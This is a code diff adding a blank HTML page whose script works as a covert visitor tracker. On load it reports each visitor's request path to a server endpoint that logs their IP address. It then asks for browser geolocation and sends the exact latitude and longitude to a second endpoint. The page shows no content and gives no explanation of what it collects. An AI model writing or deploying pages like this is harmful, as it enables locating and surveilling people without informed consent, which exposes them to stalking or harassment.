@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <!-- <p id="url"></p>
+    <p id="AllowLocation"></p> -->
+    <script>        
+        
+        
+        fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+        var Latitude;
+        var Longitude;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+            
+        } else {
+            //document.getElementById("AllowLocation").innerHTML = "Geolocation is not supported by this browser.";
+            fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+        }
+
+        async function showPosition(position) {
+                Latitude=await position.coords.latitude;
+                Longitude=await position.coords.longitude;
+                await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )
+                
+                
+                
+        }
+        async function geturl()
+        {
+            await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+        }
+        //fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+    </script>
+
+</body>
+
+</html>
